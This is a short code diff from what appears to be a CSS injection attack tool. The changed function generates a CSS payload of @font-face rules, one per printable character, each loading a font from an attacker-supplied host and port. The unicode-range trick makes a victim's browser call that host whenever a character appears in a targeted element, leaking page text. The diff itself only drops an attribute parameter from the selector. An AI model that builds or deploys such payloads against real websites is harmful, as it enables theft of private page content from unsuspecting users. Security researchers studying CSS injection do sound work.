@@ -2,11 +2,11 @@ import urllib.parse
 from cssinj.utils import default
 
 
-def generate_payload_font_face(hostname, port, attribut, element, client):
+def generate_payload_font_face(hostname, port, element, client):
     stri = ""
     for char in default.PRINTABLE:
         stri += f'@font-face{{font-family:e;src:url("//{hostname}:{port}/v?cid={client.id}&t={urllib.parse.quote_plus(char)}");unicode-range:U+{ord(char):04X};}}'
-    stri += f"{element}{'.'+attribut if attribut else ''} {{font-family:e;}}"
+    stri += f"{element}{{font-family:e;}}"
 
     return stri
 
